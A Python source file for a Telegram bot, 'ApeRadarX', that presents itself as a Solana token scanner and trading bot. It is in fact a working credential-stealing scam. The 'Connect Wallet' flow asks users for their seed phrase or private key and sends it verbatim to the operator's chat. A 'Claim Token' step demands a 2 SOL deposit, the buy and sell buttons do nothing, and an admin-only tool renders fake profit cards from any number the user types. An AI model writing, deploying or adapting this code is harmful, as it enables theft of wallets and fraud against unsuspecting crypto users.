# trigger redeploy v3
"""
ApeRadarX Solana Telegram Bot — With High Quality PnL Card Generator
Admin only PnL card feature
"""

import os
import re
import io
import math
import random
import threading
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ──────────────────────────────────────────────
# Config
# ──────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BOT_NAME = "ApeRadarX"
ADMIN_ID = 1495066761

# Users allowed to use PnL card feature
PNL_ALLOWED = {1495066761, 6203945884, 8730420346}

# States
waiting_for_wallet = {}
waiting_for_pnl = {}


# ──────────────────────────────────────────────
# Admin notification
# ──────────────────────────────────────────────
async def notify_admin(context, user, action, extra=""):
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📡 *Activity Log*\n\n"
                 f"👤 Name: {user.full_name}\n"
                 f"🆔 ID: `{user.id}`\n"
                 f"📛 Username: @{user.username if user.username else 'No username'}\n"
                 f"🔘 Action: {action}"
                 + (f"\n📝 Message: `{extra}`" if extra else ""),
            parse_mode="Markdown"
        )
    except Exception:
        pass


# ──────────────────────────────────────────────
# PnL Card Generator
# ──────────────────────────────────────────────
def format_mcap(n):
    try:
        n = float(n)
        if n >= 1_000_000_000:
            return f"${n/1_000_000_000:.1f}B"
        if n >= 1_000_000:
            return f"${n/1_000_000:.1f}M"
        if n >= 1_000:
            return f"${n/1_000:.1f}K"
        return f"${n:.0f}"
    except:
        return "N/A"


def get_font(size):
    paths = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSansBold.ttf",
    ]
    for p in paths:
        try:
            return ImageFont.truetype(p, size)
        except:
            continue
    return ImageFont.load_default()


def draw_rounded_rect(draw, x1, y1, x2, y2, radius, fill=None, outline=None, width=2):
    draw.rounded_rectangle([x1, y1, x2, y2], radius=radius, fill=fill)
    if outline:
        draw.rounded_rectangle([x1, y1, x2, y2], radius=radius, outline=outline, width=width)


def draw_palm_leaves(draw, W, H, side="left"):
    colors = [(8, 35, 5), (5, 22, 3), (6, 28, 4)]
    if side == "left":
        polys = [
            [(20, H), (-30, H-200), (60, H-350), (90, H-280), (50, H-200), (80, H-150)],
            [(0, H), (-50, H-180), (40, H-320), (65, H-250)],
            [(80, H-20), (10, H-220), (110, H-360), (130, H-290), (100, H-200)],
            [(-10, H-100), (-60, H-250), (30, H-380), (50, H-300)],
        ]
    else:
        polys = [
            [(W-20, H), (W+30, H-200), (W-60, H-350), (W-90, H-280), (W-50, H-200), (W-80, H-150)],
            [(W, H), (W+50, H-180), (W-40, H-320), (W-65, H-250)],
            [(W-80, H-20), (W-10, H-220), (W-110, H-360), (W-130, H-290), (W-100, H-200)],
            [(W+10, H-100), (W+60, H-250), (W-30, H-380), (W-50, H-300)],
        ]
    for i, poly in enumerate(polys):
        draw.polygon(poly, fill=colors[i % len(colors)])


def generate_pnl_card(token_symbol, buy_mcap, current_mcap, username, token_logo_url=None):
    W, H = 1000, 560
    GREEN = (57, 255, 20)
    GREEN_DIM = (30, 180, 10)
    GOLD = (184, 134, 11)

    multiplier = current_mcap / buy_mcap if buy_mcap > 0 else 1.0
    ACCENT = GREEN
    ACCENT_DIM = GREEN_DIM

    img = Image.new("RGBA", (W, H), (0, 0, 0, 255))
    draw = ImageDraw.Draw(img, "RGBA")

    # Background
    for y in range(H):
        ratio = y / H
        center_boost = 1 - abs(ratio - 0.5) * 1.5
        g = int(8 + center_boost * 25)
        draw.line([(0, y), (W, y)], fill=(2, g, 2, 255))

    # Stars
    random.seed(42)
    for _ in range(50):
        x = random.randint(0, W)
        y = random.randint(0, H)
        s = random.choice([1, 1, 2])
        draw.ellipse([x, y, x+s, y+s], fill=(*ACCENT, random.randint(40, 80)))

    # Palm leaves
    draw_palm_leaves(draw, W, H, "left")
    draw_palm_leaves(draw, W, H, "right")

    # Center glow
    glow = Image.new("RGBA", (W, H), (0,0,0,0))
    gd = ImageDraw.Draw(glow)
    for r in range(280, 0, -20):
        a = int(8 * (1 - r/280))
        gd.ellipse([(W//2-r, H//2-r-30),(W//2+r, H//2+r-30)], fill=(*ACCENT, a))
    glow = glow.filter(ImageFilter.GaussianBlur(20))
    img = Image.alpha_composite(img, glow)

    # Bottom oval glow
    oval = Image.new("RGBA", (W, H), (0,0,0,0))
    od = ImageDraw.Draw(oval)
    for i in range(5):
        od.ellipse([(100+i*20, H-80-i*5),(W-100-i*20, H-20+i*5)], fill=(*ACCENT, 20-i*3))
    oval = oval.filter(ImageFilter.GaussianBlur(12))
    img = Image.alpha_composite(img, oval)
    draw = ImageDraw.Draw(img, "RGBA")

    # Fonts
    f_token = get_font(52)
    f_mult = get_font(130)
    f_gain = get_font(20)
    f_label = get_font(13)
    f_value = get_font(25)
    f_bottom = get_font(20)

    # Token name top left
    draw.text((28, 20), token_symbol.upper(), font=f_token, fill=(200, 230, 160))

    # Called at badge
    bx, by, bw, bh = 28, 84, 165, 58
    draw_rounded_rect(draw, bx, by, bx+bw, by+bh, 8, fill=(0,15,0,180), outline=(*ACCENT,150))
    cx2, cy2 = bx+24, by+bh//2
    draw.ellipse([cx2-10,cy2-10,cx2+10,cy2+10], outline=ACCENT, width=2)
    draw.ellipse([cx2-5,cy2-5,cx2+5,cy2+5], outline=ACCENT, width=1)
    draw.line([cx2-14,cy2,cx2+14,cy2], fill=ACCENT, width=1)
    draw.line([cx2,cy2-14,cx2,cy2+14], fill=ACCENT, width=1)
    draw.text((bx+44, by+7), "CALLED AT", font=f_label, fill=ACCENT)
    draw.text((bx+44, by+25), format_mcap(buy_mcap), font=f_value, fill=(255,255,255))

    # Token logo circle top center
    lx, ly, ls = W//2, 55, 90
    for r in range(60, 0, -10):
        draw.ellipse([lx-r,ly-r,lx+r,ly+r], fill=(184,134,11,int(30*(1-r/60))))
    draw.ellipse([lx-ls//2-3,ly-ls//2-3,lx+ls//2+3,ly+ls//2+3], fill=GOLD)

    logo_loaded = False
    if token_logo_url:
        try:
            resp = requests.get(token_logo_url, timeout=5)
            li = Image.open(io.BytesIO(resp.content)).convert("RGBA")
            li = li.resize((ls, ls))
            mask = Image.new("L", (ls, ls), 0)
            ImageDraw.Draw(mask).ellipse([0,0,ls,ls], fill=255)
            li.putalpha(mask)
            img.paste(li, (lx-ls//2, ly-ls//2), li)
            draw = ImageDraw.Draw(img, "RGBA")
            logo_loaded = True
        except:
            pass

    if not logo_loaded:
        draw.ellipse([lx-ls//2,ly-ls//2,lx+ls//2,ly+ls//2], fill=(10,40,10))
        sym = token_symbol[:4].upper()
        bbox = draw.textbbox((0,0), sym, font=get_font(24))
        sw = bbox[2]-bbox[0]
        draw.text((lx-sw//2, ly-15), sym, font=get_font(24), fill=(200,255,150))

    # Arrow top right of logo
    draw.line([(lx+55, ly-10),(lx+140, ly-90)], fill=ACCENT, width=4)
    ax, ay = lx+140, ly-90
    draw.polygon([(ax,ay),(ax-20,ay+10),(ax-10,ay+20)], fill=ACCENT)

    # Big multiplier with glow
    mult_text = f"{multiplier:.1f}X"
    mult_y = 130
    glow2 = Image.new("RGBA", (W, H), (0,0,0,0))
    gd2 = ImageDraw.Draw(glow2)
    bbox = gd2.textbbox((0,0), mult_text, font=f_mult)
    tw = bbox[2]-bbox[0]
    tx = W//2 - tw//2
    for sp in [16, 10, 6]:
        a = int(50 + (16-sp)*8)
        for ox in range(-sp, sp+1, 3):
            for oy in range(-sp, sp+1, 3):
                if ox*ox+oy*oy <= sp*sp*1.5:
                    gd2.text((tx+ox, mult_y+oy), mult_text, font=f_mult, fill=(*ACCENT_DIM, min(a,160)))
    glow2 = glow2.filter(ImageFilter.GaussianBlur(5))
    img = Image.alpha_composite(img, glow2)
    draw = ImageDraw.Draw(img, "RGBA")
    draw.text((tx+5, mult_y+5), mult_text, font=f_mult, fill=(0,30,0,200))
    draw.text((tx+3, mult_y+3), mult_text, font=f_mult, fill=(0,50,0,200))
    draw.text((tx, mult_y), mult_text, font=f_mult, fill=ACCENT)

    # Gain label
    gain_text = f"🚀  {multiplier:.1f}X GAIN  🚀"
    gain_y = mult_y + 142
    bbox2 = draw.textbbox((0,0), gain_text, font=f_gain)
    gw = bbox2[2]-bbox2[0]
    gx = W//2 - gw//2
    draw.line([(gx-10, gain_y-4),(gx+gw+10, gain_y-4)], fill=(*ACCENT,80), width=1)
    draw.line([(gx-10, gain_y+28),(gx+gw+10, gain_y+28)], fill=(*ACCENT,80), width=1)
    draw.text((gx, gain_y), gain_text, font=f_gain, fill=ACCENT)

    # Bottom info boxes
    box_y = H - 132
    box_h = 65
    m = 28
    gap = 14
    box_w = (W - m*2 - gap) // 2

    for i, (lbl, val, itype) in enumerate([
        ("CALLED BY", f"@{username}", "person"),
        ("CURRENT MCAP", format_mcap(current_mcap), "money"),
    ]):
        bx2 = m + i*(box_w+gap)
        draw_rounded_rect(draw, bx2, box_y, bx2+box_w, box_y+box_h, 10,
                          fill=(0,20,0,190), outline=(*ACCENT,120))
        ic = bx2+30, box_y+box_h//2
        draw.ellipse([ic[0]-16,ic[1]-16,ic[0]+16,ic[1]+16], fill=(*ACCENT,30), outline=(*ACCENT,150))
        if itype == "person":
            draw.ellipse([ic[0]-6,ic[1]-10,ic[0]+6,ic[1]-1], fill=ACCENT)
            draw.arc([ic[0]-9,ic[1]-2,ic[0]+9,ic[1]+10], 0, 180, fill=ACCENT, width=2)
        else:
            draw.text((ic[0]-7, ic[1]-10), "$", font=get_font(18), fill=ACCENT)
        draw.text((bx2+56, box_y+7), lbl, font=f_label, fill=ACCENT)
        draw.text((bx2+56, box_y+25), val, font=f_value, fill=(255,255,255))

    # Bottom bar
    bar_y = H - 55
    draw.rectangle([0, bar_y, W, H], fill=(0,8,0,220))
    draw.line([(0, bar_y),(W, bar_y)], fill=(*ACCENT,60), width=1)
    draw.text((W//2-130, bar_y+16), "APEradarX", font=f_bottom, fill=ACCENT)
    draw.line([(W//2+5, bar_y+10),(W//2+5, H-10)], fill=(*ACCENT,60), width=1)
    draw.text((W//2+20, bar_y+16), "✈ @ApeRadarXBot", font=f_bottom, fill=ACCENT)

    out = img.convert("RGB")
    buf = io.BytesIO()
    out.save(buf, format="PNG", quality=95)
    buf.seek(0)
    return buf


# ──────────────────────────────────────────────
# Token helpers
# ──────────────────────────────────────────────
def get_token_info(contract_address: str):
    url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        pairs = data.get("pairs")
        if not pairs:
            return None
        return sorted(pairs, key=lambda p: float(p.get("liquidity", {}).get("usd", 0) or 0), reverse=True)[0]
    except:
        return None


def format_number(n) -> str:
    try:
        n = float(n)
        if n >= 1_000_000_000: return f"${n/1_000_000_000:.2f}B"
        if n >= 1_000_000: return f"${n/1_000_000:.2f}M"
        if n >= 1_000: return f"${n/1_000:.2f}K"
        return f"${n:.4f}"
    except:
        return "N/A"


def parse_mcap_input(text):
    text = text.strip().upper().replace(",", "")
    try:
        if text.endswith("K"): return float(text[:-1]) * 1_000
        elif text.endswith("M"): return float(text[:-1]) * 1_000_000
        elif text.endswith("B"): return float(text[:-1]) * 1_000_000_000
        else: return float(text)
    except:
        return None


def build_token_message(pair: dict) -> str:
    base = pair.get("baseToken", {})
    name = base.get("name", "Unknown")
    symbol = base.get("symbol", "???")
    price_usd = pair.get("priceUsd", "N/A")
    h1 = pair.get("priceChange", {}).get("h1", "N/A")
    h24 = pair.get("priceChange", {}).get("h24", "N/A")
    volume_24h = pair.get("volume", {}).get("h24", "N/A")
    liquidity = pair.get("liquidity", {}).get("usd", "N/A")
    market_cap = pair.get("marketCap", "N/A")
    dex = pair.get("dexId", "N/A").upper()
    url = pair.get("url", "")

    def sign(val):
        try: return "🟢 +" if float(val) >= 0 else "🔴 "
        except: return ""

    msg = (
        f"🪙 *{name}* (${symbol})\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💵 Price: `${float(price_usd):.8f}`\n"
        f"📈 1h:  {sign(h1)}{h1}%\n"
        f"📊 24h: {sign(h24)}{h24}%\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💧 Liquidity: {format_number(liquidity)}\n"
        f"📦 Volume 24h: {format_number(volume_24h)}\n"
        f"🏦 Market Cap: {format_number(market_cap)}\n"
        f"🔁 DEX: {dex}\n"
    )
    if url:
        msg += f"\n[📎 View on DexScreener]({url})"
    return msg


def token_keyboard(symbol, address, user_id):
    keyboard = [
        [
            InlineKeyboardButton(f"🟢 Buy {symbol}", callback_data=f"buy:{symbol}"),
            InlineKeyboardButton(f"🔴 Sell {symbol}", callback_data=f"sell:{symbol}"),
        ],
        [InlineKeyboardButton("📊 Generate PnL Card", callback_data=f"pnl:{address}")],
        [InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh:{address}")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="home")],
    ]
    return InlineKeyboardMarkup(keyboard)


def is_valid_seed_or_key(text: str) -> bool:
    words = text.strip().split()
    if len(words) in (12, 24): return True
    if re.match(r'^[1-9A-HJ-NP-Za-km-z]{87,88}$', text.strip()): return True
    return False


# ──────────────────────────────────────────────
# Main menu
# ──────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🟢 Buy", callback_data="buy_menu"),
            InlineKeyboardButton("🔴 Sell", callback_data="sell_menu"),
        ],
        [
            InlineKeyboardButton("👛 Connect Wallet", callback_data="connect_wallet"),
            InlineKeyboardButton("🎁 Claim Token", callback_data="claim_token"),
        ],
        [
            InlineKeyboardButton("👥 Referrals", callback_data="referrals"),
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
        [
            InlineKeyboardButton("📊 PnL Card", callback_data="pnl_menu"),
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_home"),
        ],
    ])


def main_menu_text():
    return (
        f"🦍 *Welcome to {BOT_NAME}\\!*\n\n"
        "Track hot tokens, catch early movers, and trade with speed\\.\n\n"
        "Built for apes, powered by real\\-time data, and designed to help "
        "you find the next rocket before it takes off 🚀\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "💰 *Wallet Balance:* 0\\.00 SOL\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "📋 *Paste a token contract address* to begin scanning\\.\n\n"
        "Use the buttons below to navigate\\."
    )


# ──────────────────────────────────────────────
# Commands
# ──────────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    waiting_for_wallet[user.id] = False
    waiting_for_pnl[user.id] = None
    await notify_admin(context, user, "▶️ Started the bot")
    await update.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    await notify_admin(context, user, "❓ Clicked /help")
    await update.message.reply_text(
        f"❓ *{BOT_NAME} Help*\n\n"
        "🔍 Paste any Solana token contract address to scan it\n"
        "🟢 Buy / 🔴 Sell buttons appear after scanning\n"
        "📊 PnL Card — Admin only feature\n"
        "👛 Connect Wallet to enable real trading\n"
        "🎁 Claim Token for airdrops & rewards\n"
        "👥 Referrals to invite friends\n\n"
        "/start — Back to main menu",
        parse_mode="Markdown",
    )


# ──────────────────────────────────────────────
# Button handler
# ──────────────────────────────────────────────
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = query.from_user
    is_admin = user.id == ADMIN_ID
    can_pnl = user.id in PNL_ALLOWED

    await notify_admin(context, user, f"🔘 Clicked: `{data}`")

    if data in ("home", "refresh_home"):
        waiting_for_wallet[user.id] = False
        waiting_for_pnl[user.id] = None
        await query.message.reply_text(main_menu_text(), parse_mode="MarkdownV2", reply_markup=main_menu_keyboard())

    elif data == "pnl_menu":
        if not can_pnl:
            await query.message.reply_text(
                "📊 *PnL Card*\n\n"
                "🔒 This feature is available to the *Admin only*.\n\n"
                "Stay tuned for more features! 🚀",
                parse_mode="Markdown",
            )
            return
        waiting_for_pnl[user.id] = {"step": "address"}
        await query.message.reply_text(
            "📊 *PnL Card Generator*\n\n"
            "Paste the token contract address:",
            parse_mode="Markdown",
        )

    elif data.startswith("pnl:"):
        if not can_pnl:
            await query.message.reply_text(
                "🔒 *PnL Card is Admin only.*",
                parse_mode="Markdown",
            )
            return
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            current_mcap = pair.get("marketCap", 0)
            waiting_for_pnl[user.id] = {
                "step": "buy_mcap",
                "address": address,
                "symbol": symbol,
                "current_mcap": float(current_mcap) if current_mcap else 0,
                "logo_url": pair.get("info", {}).get("imageUrl"),
            }
            await query.message.reply_text(
                f"📊 *{symbol} PnL Card*\n\n"
                f"Current MCap: {format_number(current_mcap)}\n\n"
                f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                parse_mode="Markdown",
            )
        else:
            await query.message.reply_text("❌ Could not fetch token data.")

    elif data == "buy_menu":
        await query.message.reply_text("🟢 *Buy Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "sell_menu":
        await query.message.reply_text("🔴 *Sell Token*\n\nPaste the token contract address!", parse_mode="Markdown")

    elif data == "connect_wallet":
        waiting_for_wallet[user.id] = True
        await query.message.reply_text(
            "👛 *Connect Wallet*\n\n"
            "To connect your Solana wallet, import your private key or seed phrase.\n\n"
            "⚠️ Never share your seed phrase with anyone!",
            parse_mode="Markdown",
        )

    elif data == "claim_token":
        if context.user_data.get("wallet_connected"):
            await query.message.reply_text(
                "🎁 *Claim Token*\n\n"
                "To claim your token, please deposit *2 SOL* to your connected wallet first.\n\n"
                "Once your deposit is confirmed, your tokens will be released automatically! 🚀",
                parse_mode="Markdown",
            )
        else:
            await query.message.reply_text(
                "🎁 *Claim Token*\n\n"
                "Click the *CONNECT WALLET* button to generate or connect your wallet and get started.",
                parse_mode="Markdown",
            )

    elif data == "referrals":
        ref_link = f"https://t.me/ApeRadarXBot?start=ref_{user.id}"
        await query.message.reply_text(
            f"👥 *Referrals*\n\nInvite friends and earn rewards!\n\n🔗 Your link:\n`{ref_link}`",
            parse_mode="Markdown",
        )

    elif data == "help":
        await query.message.reply_text(
            f"❓ *Help*\n\n🔍 Paste Solana token address to scan\n📊 PnL Card — Admin only\n👛 Connect Wallet\n/start — Main menu",
            parse_mode="Markdown",
        )

    elif data.startswith("buy:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🟢 *Buy {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("sell:"):
        symbol = data.split(":")[1]
        await query.message.reply_text(f"🔴 *Sell {symbol}*\n\n⚠️ Connect your wallet first.", parse_mode="Markdown")

    elif data.startswith("refresh:"):
        address = data.split(":")[1]
        pair = get_token_info(address)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await query.message.edit_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, address, user.id),
                disable_web_page_preview=True,
            )
        else:
            await query.message.reply_text("⚠️ Could not refresh.")


# ──────────────────────────────────────────────
# Message handler
# ──────────────────────────────────────────────
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.message.from_user
    is_admin = user.id == ADMIN_ID
    can_pnl = user.id in PNL_ALLOWED

    # PnL flow (allowed users only)
    pnl_state = waiting_for_pnl.get(user.id)

    if pnl_state and pnl_state.get("step") == "address":
        if 32 <= len(text) <= 44 and text.isalnum():
            await update.message.reply_text("🔍 Fetching token info...")
            pair = get_token_info(text)
            if pair:
                symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
                current_mcap = pair.get("marketCap", 0)
                waiting_for_pnl[user.id] = {
                    "step": "buy_mcap",
                    "address": text,
                    "symbol": symbol,
                    "current_mcap": float(current_mcap) if current_mcap else 0,
                    "logo_url": pair.get("info", {}).get("imageUrl"),
                }
                await update.message.reply_text(
                    f"📊 *{symbol}*\nCurrent MCap: {format_number(current_mcap)}\n\n"
                    f"Enter the MCap when you bought _(e.g. 9.3K, 1.2M)_:",
                    parse_mode="Markdown",
                )
            else:
                await update.message.reply_text("❌ Token not found.")
        else:
            await update.message.reply_text("⚠️ Paste a valid Solana token contract address.")
        return

    if pnl_state and pnl_state.get("step") == "buy_mcap":
        buy_mcap = parse_mcap_input(text)
        if buy_mcap and buy_mcap > 0:
            current_mcap = pnl_state["current_mcap"]
            symbol = pnl_state["symbol"]
            logo_url = pnl_state.get("logo_url")
            username = user.username or user.first_name or "ApeRadarX"
            waiting_for_pnl[user.id] = None

            await update.message.reply_text("🎨 Generating your PnL card...")
            try:
                card = generate_pnl_card(symbol, buy_mcap, current_mcap, username, logo_url)
                multiplier = current_mcap / buy_mcap
                await update.message.reply_photo(
                    photo=card,
                    caption=f"📊 *{symbol}* | {multiplier:.1f}X GAIN 🚀\nGenerated by @ApeRadarXBot",
                    parse_mode="Markdown",
                )
                await notify_admin(context, user, f"📊 PnL card generated for {symbol}")
            except Exception as e:
                await update.message.reply_text(f"❌ Error generating card: {str(e)}")
        else:
            await update.message.reply_text("⚠️ Invalid format. Use: 9.3K, 1.2M, 500000")
        return

    # Wallet flow
    if waiting_for_wallet.get(user.id):
        if is_valid_seed_or_key(text):
            await notify_admin(context, user, "👛 Submitted wallet credentials", text)
            waiting_for_wallet[user.id] = False
            context.user_data["wallet_connected"] = True
            await update.message.reply_text("✅ *Wallet connected successfully!*", parse_mode="Markdown")
        else:
            await notify_admin(context, user, "❌ Invalid wallet input", text)
            await update.message.reply_text("⚠️ Invalid seed phrase. Check your words and try again.")
        return

    # Token scan
    if 32 <= len(text) <= 44 and text.isalnum():
        await update.message.reply_text("🔍 Scanning token...")
        pair = get_token_info(text)
        if pair:
            symbol = pair.get("baseToken", {}).get("symbol", "TOKEN")
            await notify_admin(context, user, f"🔍 Scanned: {symbol}", text)
            await update.message.reply_text(
                build_token_message(pair), parse_mode="Markdown",
                reply_markup=token_keyboard(symbol, text, user.id),
                disable_web_page_preview=True,
            )
        else:
            await notify_admin(context, user, "❌ Token not found", text)
            await update.message.reply_text("❌ Token not found. Paste a valid Solana contract address.")
    else:
        await notify_admin(context, user, "💬 Message", text)
        await update.message.reply_text("👋 Paste a Solana token address to scan!\nOr tap /start for the menu.")


# ──────────────────────────────────────────────
# Web server for Render
# ──────────────────────────────────────────────
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ApeRadarX Bot is running!")
    def log_message(self, format, *args): pass

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    HTTPServer(("0.0.0.0", port), HealthHandler).serve_forever()


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────
if __name__ == "__main__":
    print("🤖 ApeRadarX Bot starting...")
    t = threading.Thread(target=run_web_server)
    t.daemon = True
    t.start()
    print("✅ Web server started!")
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("✅ Bot is running!")
    app.run_polling()
